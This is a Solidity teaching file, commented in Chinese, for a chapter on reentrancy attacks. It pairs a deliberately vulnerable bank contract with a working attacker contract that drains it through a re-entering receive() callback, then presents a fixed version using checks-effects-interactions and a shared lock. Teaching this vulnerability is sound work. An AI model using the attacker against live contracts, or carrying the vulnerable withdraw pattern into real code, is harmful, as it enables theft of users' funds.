// SPDX-License-Identifier: MIT
// 配套章节：03 重入攻击 ｜ 交互实验：interactive/reentrancy-lab.html
// 仅用于学习。不要部署到主网。
pragma solidity ^0.8.20;

/// @notice ❌ 漏洞版：先转账，后记账；transfer 与 withdraw 共享状态却没有锁
contract VulnerableBank {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // ❌ 漏洞：外部调用发生在状态更新之前
    function withdraw() external {
        uint256 amt = balances[msg.sender];
        require(amt > 0, "no balance");
        (bool ok, ) = msg.sender.call{value: amt}("");
        require(ok, "send failed");
        balances[msg.sender] = 0;
    }

    // ❌ 跨函数重入的入口：回调中调用它，可以把"尚未清零"的余额转给同伙
    function transfer(address to, uint256 amt) external {
        require(balances[msg.sender] >= amt, "insufficient");
        balances[msg.sender] -= amt;
        balances[to] += amt;
    }
}

/// @notice 攻击合约：演示单函数重入
contract ReentrancyAttacker {
    VulnerableBank public immutable bank;
    address public immutable owner;

    constructor(VulnerableBank _bank) {
        bank = _bank;
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.sender == owner, "owner only");
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        // 只要银行还有钱，就再进入一次 withdraw()
        if (address(bank).balance >= msg.value && msg.value > 0) {
            bank.withdraw();
        }
    }

    function collect() external {
        require(msg.sender == owner, "owner only");
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "collect failed");
    }
}

/// @notice 最小重入锁（与 OpenZeppelin ReentrancyGuard 原理相同）
abstract contract SimpleReentrancyGuard {
    uint256 private _status = 1; // 1 = 未进入，2 = 已进入

    modifier nonReentrant() {
        require(_status == 1, "reentrant call");
        _status = 2;
        _;
        _status = 1;
    }
}

/// @notice ✅ 修复版：CEI + 所有共享状态的入口共用同一把锁
contract SafeBank is SimpleReentrancyGuard {
    mapping(address => uint256) public balances;

    function deposit() external payable nonReentrant {
        balances[msg.sender] += msg.value;
    }

    // ✅ 修复：Checks → Effects → Interactions
    function withdraw() external nonReentrant {
        uint256 amt = balances[msg.sender];          // Checks
        require(amt > 0, "no balance");
        balances[msg.sender] = 0;                    // Effects
        (bool ok, ) = msg.sender.call{value: amt}(""); // Interactions
        require(ok, "send failed");
    }

    // ✅ 修复：transfer 也加同一把锁，防止跨函数重入
    function transfer(address to, uint256 amt) external nonReentrant {
        require(balances[msg.sender] >= amt, "insufficient");
        balances[msg.sender] -= amt;
        balances[to] += amt;
    }
}
